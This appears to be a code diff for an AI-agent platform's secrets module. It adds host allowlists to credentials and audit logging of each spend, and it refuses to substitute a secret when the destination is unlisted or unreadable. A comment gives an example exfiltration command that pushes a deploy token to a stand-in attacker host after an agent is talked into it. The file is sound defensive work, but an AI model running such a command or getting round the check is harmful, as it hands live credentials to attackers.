@@ -31,6 +31,7 @@
 // back into a transcript, a tool RESULT, or a record. The guard's `secret_leak`
 // remains the backstop for when something does.
 import { randomUUID } from 'node:crypto'
+import { logAudit } from './audit'
 import { db } from './db/pg'
 import { open, seal } from './secretbox'
 
@@ -69,6 +70,9 @@ export interface SecretDoc {
   expiresAt: string | null
   usesRemaining: number | null
   lastUsedAt: string | null
+  /** Hosts this credential may be spent against. EMPTY = unrestricted, which is
+   *  what every secret predating the check has. */
+  allowedHosts: string[]
   /** KEYS AND LABELS ONLY. There is no shape of this type that carries a value —
    *  every listing surface, every API response and every log line is built from
    *  this, so the value has nowhere to escape to by accident. */
@@ -89,14 +93,16 @@ export async function createSecretDoc(input: {
   expiresAt?: string | null
   uses?: number | null
   grantTo?: string[]
+  allowedHosts?: string[]
 }): Promise<SecretDoc> {
   if (input.entries.length === 0) throw new Error('a secret needs at least one entry')
   const sql = await db()
   const kind: SecretKind = input.kind ?? 'vault'
   const uses = input.uses !== undefined ? input.uses : kind === 'relay' ? 1 : null
   const rows = (await sql`
-    insert into workspace_secrets (name, title, kind, note, created_by, expires_at, uses_remaining)
-    values (${input.name}, ${input.title}, ${kind}, ${input.note ?? null}, ${input.createdBy ?? null}, ${input.expiresAt ?? null}, ${uses})
+    insert into workspace_secrets (name, title, kind, note, created_by, expires_at, uses_remaining, allowed_hosts)
+    values (${input.name}, ${input.title}, ${kind}, ${input.note ?? null}, ${input.createdBy ?? null}, ${input.expiresAt ?? null}, ${uses},
+            ${(input.allowedHosts ?? []).map((h) => h.trim().toLowerCase()).filter(Boolean)})
     returning id
   `) as unknown as Array<{ id: string }>
   const id = rows[0]!.id
@@ -144,7 +150,11 @@ export async function mintRelay(input: {
   agentModel: string
   createdBy?: string | null
   note?: string | null
-}): Promise<{ name: string; handle: string; label: string; expiresAt: string }> {
+  /** Optional: pin the one-shot to the host it is for. A relay is already
+   *  bounded three ways; this is the fourth, and the only one that survives an
+   *  agent being talked into spending it somewhere else. */
+  allowedHosts?: string[]
+}): Promise<{ name: string; handle: string; label: string; expiresAt: string; allowedHosts: string[] }> {
   // Random, not derived from the label: a guessable name is one another agent
   // could ask for, and the grant check is the only thing that would stop it.
   const name = `relay-${randomUUID().replace(/-/g, '').slice(0, 12)}`
@@ -161,8 +171,9 @@ export async function mintRelay(input: {
     expiresAt,
     uses: 1,
     grantTo: [input.agentModel],
+    ...(input.allowedHosts?.length ? { allowedHosts: input.allowedHosts } : {}),
   })
-  return { name, handle: handleFor(name), label: input.label, expiresAt }
+  return { name, handle: handleFor(name), label: input.label, expiresAt, allowedHosts: input.allowedHosts ?? [] }
 }
 
 /** One doc, keys and labels only. */
@@ -170,7 +181,8 @@ export async function getSecretDoc(name: string): Promise<SecretDoc | null> {
   const sql = await db()
   const rows = (await sql`
     select id, name, title, kind, note, created_by as "createdBy", created_at as "createdAt",
-           expires_at as "expiresAt", uses_remaining as "usesRemaining", last_used_at as "lastUsedAt"
+           expires_at as "expiresAt", uses_remaining as "usesRemaining", last_used_at as "lastUsedAt",
+           coalesce(allowed_hosts, '{}') as "allowedHosts"
       from workspace_secrets where name = ${name}
   `) as unknown as Array<Omit<SecretDoc, 'entries' | 'grants'>>
   const row = rows[0]
@@ -222,14 +234,78 @@ export async function deleteSecretDoc(name: string): Promise<void> {
  *  or "not yours". */
 export interface UnresolvedHandle {
   handle: string
-  reason: 'unknown' | 'not-granted' | 'expired' | 'spent' | 'ambiguous'
+  reason: 'unknown' | 'not-granted' | 'expired' | 'spent' | 'ambiguous' | 'destination'
+  /** For `destination`: where it was about to be spent. Named so an operator
+   *  reading the log learns which host to add — or which attack just failed. */
+  host?: string
 }
+
+// ── WHERE IS THIS CREDENTIAL ABOUT TO GO? ────────────────────────────────────
+//
+// The substitution has always been blind to destination: a handle resolves
+// wherever it appears, so an agent talked into `git push «secret:deploy»@
+// evil.example` hands over a live token and every layer downstream sees an
+// ordinary tool call. `allowed_hosts` is the fix, and this is the hard half of
+// it — the text being substituted into is arbitrary tool arguments, and the
+// destination has to be read out of them.
+//
+// DELIBERATELY NARROW, because the cost of a false POSITIVE here is a refused
+// legitimate call. A first pass matched anything with a dot in it and read
+// `package.json` and `index.ts` as hosts, which would have made an allowlisted
+// credential unusable inside any command that mentioned a file. So:
+//
+//   · URLs and git/ssh remotes, where the host is unambiguous, and
+//   · a BARE token standing alone as its own argument (`docker login … registry.
+//     outcrop.dev`, `curl … api.example.com`) whose last label is a plausible
+//     TLD and is not a file extension.
+//
+// What is NOT extractable is handled by refusing — see `resolveHandles`. An
+// unverifiable destination is not a verified one, and for a credential somebody
+// deliberately locked down that is the right direction to fail in.
+const URL_HOST = /(?:https?|ssh|git):\/\/(?:[^@/\s]*@)?([a-z0-9][a-z0-9.-]*[a-z0-9])(?::\d+)?/gi
+const SCP_HOST = /(?:^|[\s"'`])(?:[a-z0-9_.-]+@)([a-z0-9][a-z0-9.-]*[a-z0-9]):/gi
+const BARE_HOST = /(?:^|[\s"'`=])((?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z]{2,24})(?=[\s"'`/:,]|$)/gi
+
+/** Extensions a bare `something.ext` token is far likelier to be than a host.
+ *  Not exhaustive and does not need to be: everything it misses fails CLOSED. */
+const FILE_EXT =
+  /^(?:json|jsonc|ts|tsx|js|jsx|mjs|cjs|md|mdx|ya?ml|txt|lock|toml|sh|bash|zsh|py|rb|go|rs|java|c|h|cpp|env|gz|tgz|tar|zip|png|jpe?g|gif|svg|ico|html?|css|scss|sql|xml|csv|tsv|log|cfg|ini|conf|pem|key|crt|pdf|so|dll|exe)$/i
+
+/** Every host this text would send something to, lowercased and deduped. */
+export function hostsIn(text: string): string[] {
+  const out = new Set<string>()
+  for (const re of [URL_HOST, SCP_HOST]) {
+    for (const m of text.matchAll(new RegExp(re.source, re.flags))) if (m[1]) out.add(m[1].toLowerCase())
+  }
+  for (const m of text.matchAll(new RegExp(BARE_HOST.source, BARE_HOST.flags))) {
+    const host = m[1]?.toLowerCase()
+    if (!host) continue
+    const ext = host.slice(host.lastIndexOf('.') + 1)
+    if (FILE_EXT.test(ext)) continue
+    out.add(host)
+  }
+  return [...out]
+}
+
+/** Is `host` covered by an allowlist entry? Exact, or a subdomain of one —
+ *  `github.com` covers `api.github.com` but never `github.com.evil.net`, which
+ *  is the whole reason this is not `endsWith`. */
+export const hostAllowed = (host: string, allowed: readonly string[]): boolean =>
+  allowed.some((a) => {
+    const entry = a.trim().toLowerCase().replace(/^\.+/, '')
+    return entry !== '' && (host === entry || host.endsWith(`.${entry}`))
+  })
 
 export interface Resolution {
   text: string
   /** Docs actually spent, for the audit line. Names, never values. */
   used: Array<{ name: string; key: string; label: string }>
   unresolved: UnresolvedHandle[]
+  /** Every destination this text would reach. Recorded on the spend whether or
+   *  not the secret restricts them — "where did our deploy key go" is a question
+   *  an operator asks AFTER something happened, and an unrestricted secret is
+   *  exactly the one nobody was watching. */
+  hosts: string[]
 }
 
 /** SUBSTITUTE HANDLES FOR VALUES, at an outbound boundary and nowhere else.
@@ -244,11 +320,14 @@ export interface Resolution {
  *  last use of a one-shot. */
 export async function resolveHandles(text: string, caller: string): Promise<Resolution> {
   const found = [...text.matchAll(HANDLE)]
-  if (found.length === 0) return { text, used: [], unresolved: [] }
+  if (found.length === 0) return { text, used: [], unresolved: [], hosts: [] }
 
   const sql = await db()
   const used: Resolution['used'] = []
   const unresolved: UnresolvedHandle[] = []
+  // Read ONCE, off the text the model wrote — before any substitution, so a
+  // credential that happens to contain a dot cannot invent a destination.
+  const hosts = hostsIn(text)
   let out = text
 
   for (const m of found) {
@@ -258,10 +337,19 @@ export async function resolveHandles(text: string, caller: string): Promise<Reso
 
     const rows = (await sql`
       select s.id, s.name, s.kind, s.expires_at as "expiresAt", s.uses_remaining as "usesRemaining",
+             s.allowed_hosts as "allowedHosts",
              (select count(*) from workspace_secret_grants g where g.secret_id = s.id and g.agent_model = ${caller}) as "granted"
         from workspace_secrets s
        where lower(s.name) = ${docName}
-    `) as unknown as Array<{ id: string; name: string; kind: SecretKind; expiresAt: string | null; usesRemaining: number | null; granted: string }>
+    `) as unknown as Array<{
+      id: string
+      name: string
+      kind: SecretKind
+      expiresAt: string | null
+      usesRemaining: number | null
+      allowedHosts: string[] | null
+      granted: string
+    }>
     const doc = rows[0]
     if (!doc) {
       unresolved.push({ handle, reason: 'unknown' })
@@ -274,6 +362,39 @@ export async function resolveHandles(text: string, caller: string): Promise<Reso
     if (doc.expiresAt && new Date(doc.expiresAt).getTime() <= Date.now()) {
       unresolved.push({ handle, reason: 'expired' })
       continue
+    }
+
+    // ── WHERE IS IT GOING? ────────────────────────────────────────────────────
+    //
+    // BEFORE THE SPEND, deliberately: a refusal here must not consume a use of a
+    // one-shot. An attacker who could burn a relay just by naming a bad host
+    // would have a denial-of-service on every credential in the workspace.
+    //
+    // An EMPTY allowlist means unrestricted, which is what every secret created
+    // before this existed has — so nothing that worked yesterday stops working.
+    // A non-empty one is an operator saying "this credential is for these hosts",
+    // and then:
+    //
+    //   · a host that is not covered REFUSES, and
+    //   · NO VISIBLE HOST AT ALL ALSO REFUSES.
+    //
+    // The second half is the one worth defending. `hostsIn` is narrow on purpose
+    // and there are real commands it cannot read a destination out of; treating
+    // "I could not tell" as "it must be fine" would let any attacker who phrases
+    // the exfiltration unusually walk straight past the check. An unverifiable
+    // destination is not a verified one, and the operator who locked this
+    // credential down asked for exactly this answer.
+    const allowed = doc.allowedHosts ?? []
+    if (allowed.length > 0) {
+      const bad = hosts.find((h) => !hostAllowed(h, allowed))
+      if (bad !== undefined) {
+        unresolved.push({ handle, reason: 'destination', host: bad })
+        continue
+      }
+      if (hosts.length === 0) {
+        unresolved.push({ handle, reason: 'destination' })
+        continue
+      }
     }
 
     const entries = (await sql`
@@ -328,9 +449,32 @@ export async function resolveHandles(text: string, caller: string): Promise<Reso
       await sql`update workspace_secret_entries set value_cipher = '' where secret_id = ${doc.id}`
     }
     used.push({ name: doc.name, key: entry.key, label: entry.label })
+
+    // ── THE ONE EVENT WORTH AUDITING, AND THE ONE THAT WAS NOT ────────────────
+    //
+    // Minting, granting, revoking and deleting all wrote audit rows from the
+    // day they existed. The SPEND — the only moment a credential actually
+    // MOVES — was a console.warn, which means "where did our deploy key go"
+    // stopped being answerable at the next log rotation. That is the question
+    // an incident opens with.
+    //
+    // HERE RATHER THAN AT THE CALL SITES, because there are two of them
+    // (`callMcpTool` and the MCP gateway) and a third will exist eventually. A
+    // record every boundary writes for itself is a record that drifts.
+    //
+    // NAMES, KINDS AND DESTINATIONS — never a value, and never the text it was
+    // substituted into, which by definition now contains one.
+    void logAudit({
+      actor: caller,
+      action: 'secrets.spend',
+      targetType: 'secret',
+      targetId: doc.name,
+      targetLabel: entry.label,
+      after: { key: entry.key, hosts, kind: doc.kind, exhausted, restricted: allowed.length > 0 },
+    })
   }
 
-  return { text: out, used, unresolved }
+  return { text: out, used, unresolved, hosts }
 }
 
 /** A JSON-RPC envelope, as much of one as spending a credential needs to know. */
